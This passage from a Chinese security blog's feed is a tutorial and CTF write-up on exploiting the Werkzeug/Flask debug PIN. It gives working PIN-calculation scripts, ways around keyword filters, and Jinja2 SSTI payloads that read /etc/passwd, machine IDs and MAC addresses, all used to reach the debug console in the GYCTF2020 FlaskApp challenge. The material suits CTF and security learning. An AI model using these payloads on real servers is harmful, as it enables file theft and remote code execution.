<p><code>https://y4tacker.github.io/2022/06/19/year/2022/6/%E5%85%B3%E4%BA%8Epearcmd%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</code></p>
<p><code>https://yuy0ung.github.io/2024/03/27/pearcmd/</code></p>
]]></content>
      <categories>
        <category>文件包含</category>
        <category>利用pearcmd.php</category>
      </categories>
  </entry>
  <entry>
    <title>Python Debug PIN码的利用及做题笔记</title>
    <url>/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p><strong>利用pin码可以在报错界面执行任意python代码</strong></p>
<span id="more"></span>

<p><strong>先了解一下debug是什么</strong>：debug是由bug词得来的，bug就是程序故障。debug就是排除程序故障的意思。</p>
<p>而解决程序故障通常都是通过工具（即debug调试器）来对代码进行调试，一步步找出程序中出现bug的位置。</p>
<p><a href="https://zhuanlan.zhihu.com/p/62610785">参考文章</a></p>
<h3 id="PIN码的利用"><a href="#PIN码的利用" class="headerlink" title="PIN码的利用"></a>PIN码的利用</h3><h4 id="PIN是什么"><a href="#PIN是什么" class="headerlink" title="PIN是什么"></a>PIN是什么</h4><p><strong>PIN是 Werkzeug（它是 Flask 的依赖项之一）提供的额外安全措施，以防止在不知道 PIN 的情况下访问调试器。 您可以使用浏览器中的调试器引脚来启动交互式调试器。</strong><br>引用<br>请注意，无论如何，您都不应该在生产环境中使用调试模式，因为错误的堆栈跟踪可能会揭示代码的多个方面。<br>引用<br>调试器 PIN 只是一个附加的安全层，以防您无意中在生产应用程序中打开调试模式，从而使攻击者难以访问调试器。</p>
<p><strong>werkzeug不同版本</strong>以及python不同版本都会影响PIN码的生成</p>
<p>但是PIN码并不是随机生成，当我们重复运行同一程序时，生成的PIN一样，PIN码生成满足一定的生成算法</p>
<h4 id="pin码的生成算法"><a href="#pin码的生成算法" class="headerlink" title="pin码的生成算法"></a>pin码的生成算法</h4><p>一个简单的flask测试程序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;haha&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>这是一个基本的使用flask框架创建web应用的示例，解析一下这串代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask: 这行代码导入了 Flask 框架，使我们可以在代码中使用 Flask 的功能。</span><br><span class="line"></span><br><span class="line">app = Flask(__name__): 这行代码创建了一个应用对象 app，它是 Flask 类的一个实例。__name__ 参数是用来确定应用的根目录，通常是 Python 模块的名称。这样做是为了告诉 Flask 在哪里寻找模板、静态文件等。</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;): 这是一个装饰器，用于告诉 Flask 应用如何响应来自根 URL（&quot;/&quot;）的请求。在这个例子中，根 URL 的请求会被传递到 hello() 函数进行处理。</span><br><span class="line"></span><br><span class="line">def hello(): 这是一个视图函数，用于处理根 URL 的请求。视图函数负责处理请求并返回响应。</span><br><span class="line"></span><br><span class="line">return &#x27;haha&#x27; :一个简单的字符串作为 HTTP 响应的主体内容。</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;: :这是 Python 中的一个惯用法，用于检查当前模块是否被直接运行。如果是，则执行下面的代码块。</span><br><span class="line"></span><br><span class="line">app.run(host=&quot;0.0.0.0&quot;, port=8080, debug=True): 这行代码启动了 Flask 应用的开发服务器。host=&quot;0.0.0.0&quot; 参数指定了服务器监听所有公共 IP 地址，port=8080 参数指定了服务器监听的端口号，debug=True 参数启用了调试模式，这样在代码发生变化时，服务器会自动重启以加载最新的代码。</span><br></pre></td></tr></table></figure>

<p>运行后就会在控制台看到PIN码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> * Serving Flask app <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"> * Debug mode: on</span><br><span class="line">WARNING: This <span class="keyword">is</span> a development server. Do <span class="keyword">not</span> use it <span class="keyword">in</span> a production deployment. Use a production WSGI server instead.</span><br><span class="line"> * Running on <span class="built_in">all</span> addresses (<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>)</span><br><span class="line"> * Running on http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span></span><br><span class="line"> * Running on http://<span class="number">192.168</span><span class="number">.173</span><span class="number">.123</span>:<span class="number">8080</span></span><br><span class="line">Press CTRL+C to quit</span><br><span class="line"> * Restarting <span class="keyword">with</span> stat</span><br><span class="line"> * Debugger <span class="keyword">is</span> active!</span><br><span class="line"> * Debugger PIN: xxx-xxx-xxx</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而在源代码中PIN码生成的具体代码跟进参考<a href="https://xz.aliyun.com/t/8092?time__1311=n4+xuDgDBADQYiKP40HwbDyiDcDjr2qGIKNUQYx&alichlgref=https://www.google.com.hk/">文章</a></p>
<p>PIN码一般都是固定的，只要掌握了下面几个元素，就可以利用脚本生成PIN码</p>
<p>PIN码生成要素：</p>
<p>利用PIN值的关键代码在<code>Lib\site-packages\werkzeug\debug\__init__.py</code>,可以查看</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">第一部分</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>,  <span class="comment">#服务器运行flask所登录的用户名，username。</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># appname</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="comment">#flask库下app.py的绝对路径</span></span><br><span class="line">]</span><br><span class="line">username：通过getpass.getuser()读取，通过文件读取/etc/passwd，可能为root，到时候具体看，不行就每个用户名都试试</span><br><span class="line">modname：通过<span class="built_in">getattr</span>(mod,“file”,<span class="literal">None</span>)读取，默认值为flask.app</span><br><span class="line">appname：通过<span class="built_in">getattr</span>(app, <span class="string">&#x27;__name__&#x27;</span>, <span class="built_in">getattr</span>(app.__class__, <span class="string">&#x27;__name__&#x27;</span>))读取，默认值为Flask</span><br><span class="line">第四个参数：<span class="built_in">getattr</span>(mod, <span class="string">&#x27;__file__&#x27;</span>, <span class="literal">None</span>),或通过报错得到，但是需要注意的是，python3是app.py，python2是app.pyc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二部分</span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>, <span class="comment">#当前网络的mac地址的十进制数 &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;#机器的id</span></span><br><span class="line">]</span><br><span class="line">十进制数的原始数的获得其中可以在/sys/<span class="keyword">class</span>/net/eth0/address 获取(eth0为网卡名)</span><br><span class="line"></span><br><span class="line">对于非docker机每一个机器都会有自已唯一的<span class="built_in">id</span>：</span><br><span class="line">machine_id由三个合并（docker就后两个）：</span><br><span class="line"><span class="number">1.</span> /etc/machine-<span class="built_in">id</span>（docker环境下不用读这个，直接拼接后面两个即可）</span><br><span class="line"><span class="number">2.</span>/proc/sys/kernel/random/boot_id（有boot-<span class="built_in">id</span>那就拼接boot-<span class="built_in">id</span>）</span><br><span class="line"><span class="number">3.</span>/proc/self/cgroup（截取最后一个斜杠后面的内容）</span><br><span class="line"><span class="comment"># 例如：name=systemd:/docker/2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8</span></span><br><span class="line"><span class="comment"># 则只截取2f27f61d1db036c6ac46a9c6a8f10348ad2c43abfa97ffd979fbb1629adfa4c8拼接到后面</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于文件里的mac地址一般为十六进制并且有<code>:</code>分别，可以使用如下脚本直接生成十进制的数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义原始的十六进制字符串，其中包含冒号</span></span><br><span class="line">a = <span class="string">&quot;a2:89:2e:1f:6a:8b&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用replace函数移除字符串中的所有冒号</span></span><br><span class="line">b = a.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用int函数将十六进制字符串转换为十进制整数</span></span><br><span class="line"><span class="comment"># int函数的第一个参数是要转换的字符串</span></span><br><span class="line"><span class="comment"># 第二个参数是字符串的进制，这里为16表示十六进制</span></span><br><span class="line">resault = <span class="built_in">int</span>(b, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印出转换后的十进制数值</span></span><br><span class="line"><span class="built_in">print</span>(resault)</span><br></pre></td></tr></table></figure>

<p>获得pin码后，只要开启了debug模式，就可以访问调试模式下的特殊路由（&#x2F;console），即使没有设置过。</p>
<h4 id="不同版本算法区别"><a href="#不同版本算法区别" class="headerlink" title="不同版本算法区别"></a>不同版本算法区别</h4><p>3.6采用MD5加密，3.8采用sha1加密，现在基本高版本，所以脚本有所不同</p>
<p><strong>3.6 MD5</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span> <span class="comment">#读/etc/passwd</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment">#默认</span></span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,<span class="comment">#默认</span></span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span><span class="comment">#报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p><strong>3.8 SHA1</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377581187&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<h4 id="过滤相关"><a href="#过滤相关" class="headerlink" title="过滤相关"></a>过滤相关</h4><h5 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h5><ol>
<li>**过滤<code>self</code>**：也就是<code>/proc/self/cgroup</code>没法用了，其实其中的<code>self</code>可以用相关进程的pid去替换，这里<code>1</code>就行，也就是<code>proc/1/cgroup</code></li>
<li>**过滤<code>cgroup</code>**：可以考虑<code>mountinfo</code>或者<code>cpuset</code>，同样可以结合上面那个<code>1</code>用。一般两个都ban的时候就直接使用<code>/proc/1/cpuset</code></li>
</ol>
<h3 id="做题过程"><a href="#做题过程" class="headerlink" title="做题过程"></a>做题过程</h3><h5 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h5><p>buu上可复现</p>
<p>开题即是base64加密与解密，有hint页面，在源代码处看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- PIN ---&gt;</span><br></pre></td></tr></table></figure>

<p>所以这道题应该是考的debug模式下利用PIN码进行任意命令执行，猜测合理在base64解密的时候可以进行文件读取，这里就尝试SSTI读取。</p>
<p>稍微测试了一下，过滤popen，import与os，找到一个读文件的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read()&#125;&#125;</span><br><span class="line">这个也行：</span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;但是这里用的上面那个</span><br></pre></td></tr></table></figure>

<p>加密后拿去解密页面解密出现如下：<br><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515085456897.png" alt="image-20240515085456897"></p>
<p>这里就可以知道username为<code>flaskweb</code>，</p>
<p>这是可以尝试读取flask框架的网页源代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>可以读到被html编码的源代码，将其解码并正常排版后为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, render_template, request, flash, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64加密&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm1</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64解密&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;chr&quot;</span>, <span class="string">&quot;request&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;subprocess&quot;</span>, <span class="string">&quot;commands&quot;</span>, <span class="string">&quot;socket&quot;</span>, <span class="string">&quot;hex&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    txt = <span class="string">&quot;失败乃成功之母！！&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>, txt=txt)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>):</span><br><span class="line">        text = request.values.get(<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line">        text_decode = base64.b64encode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode()))</span><br><span class="line">        res = render_template_string(tmp)</span><br><span class="line">        flash(tmp)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;encode&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, form=form, method=<span class="string">&quot;加密&quot;</span>, img=<span class="string">&quot;flask.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>):</span><br><span class="line">        text = request.values.get(<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp):</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res = render_template_string(tmp)</span><br><span class="line">        flash(res)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm1(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, form=form, method=<span class="string">&quot;解密&quot;</span>, img=<span class="string">&quot;flask1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;name&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>, name=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到黑名单以及确实可以利用ssti。</p>
<p>然后现在就是读取其他几个要素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">随便输入报错得到/usr/local/lib/python3.7/site-packages/flask/app.py</span><br></pre></td></tr></table></figure>

<p>mac值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">然后利用</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/sys/class/net/eth0/address&quot;).read()&#125;&#125;</span><br><span class="line">得到十六进制的a2:89:2e:1f:6a:8b</span><br><span class="line">再使用如下脚本将这个替换为十进制的数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_string = &quot;a2:89:2e:1f:6a:8b&quot;</span><br><span class="line">cleaned_hex_string = hex_string.replace(&quot;:&quot;, &quot;&quot;)</span><br><span class="line">decimal_value = int(cleaned_hex_string, 16)</span><br><span class="line">print(decimal_value)</span><br><span class="line"></span><br><span class="line">得到178710068030091</span><br></pre></td></tr></table></figure>

<p>最后获取机器id</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">同样利用这个读取</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/etc/machine-id&quot;).read()&#125;&#125;</span><br><span class="line">得到</span><br><span class="line">1408f836b0ca514d796cbf8960e45fa1</span><br></pre></td></tr></table></figure>

<p>现在都有了，直接上生成pin码的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span> <span class="comment">#读/etc/passwd</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment">#默认</span></span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,<span class="comment">#默认</span></span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span><span class="comment">#报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;178710068030091&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>生成<code>897-132-638</code>，</p>
<p>随后就再访问console页面并输入PIN码，如下获得flag</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515093557898.png" alt="image-20240515093557898"></p>
